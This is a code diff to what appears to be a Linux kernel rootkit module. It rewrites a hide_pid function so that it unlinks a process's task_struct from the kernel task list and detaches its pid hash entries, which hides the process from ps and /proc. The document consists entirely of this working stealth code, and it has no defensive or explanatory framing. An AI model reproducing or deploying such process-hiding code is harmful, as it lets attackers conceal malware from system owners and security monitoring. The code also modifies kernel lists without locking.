@@ -4,6 +4,14 @@
 #include <linux/proc_fs.h>
 #include <linux/sched/task.h>
 
+#include <linux/fs.h>
+#include <linux/fdtable.h>
+#include <linux/slab.h>
+#include <linux/fs_struct.h>
+#include <linux/pid.h>
+#include <linux/delay.h>
+#include <linux/dirent.h>
+
 #include "common.h"
 #include "hook.h"
 #include "pidhide.h"
@@ -75,23 +83,20 @@ hide_pid(pid_t pid)
     if (!ts)
         return;
 
-    struct task_struct *tmp;
-    struct list_head *pos, *q;
-    struct task_struct mylist;
+	ts->tasks.prev->next = ts->tasks.next;
+	ts->tasks.next->prev = ts->tasks.prev;
 
-    rcu_read_lock();
-    atomic_dec(&__task_cred(ts)->user->processes);
-    rcu_read_unlock();
+    int i;
+    struct pid *spid = get_task_pid(ts, PIDTYPE_PID);
 
-    write_lock_irq(rwlock);
-    list_for_each_safe(pos, q, &ts.tasks){
-        tmp= list_entry(pos, struct task_struct, tasks);
-        if (((struct task_struct *)pos) == ((struct task_struct *)ts)) {
-            /* list_del(pos); */
-            DEBUG_INFO("FOUND\n");
-        }
+    for (i = 0; i <= spid->level; i++) {
+        struct upid *upid = spid->numbers + i;
+
+        if(upid->pid_chain.next)
+            upid->pid_chain.next->pprev = upid->pid_chain.pprev;
+
+        *upid->pid_chain.pprev = upid->pid_chain.next;
     }
-    write_unlock_irq(rwlock);
 }
 
 void
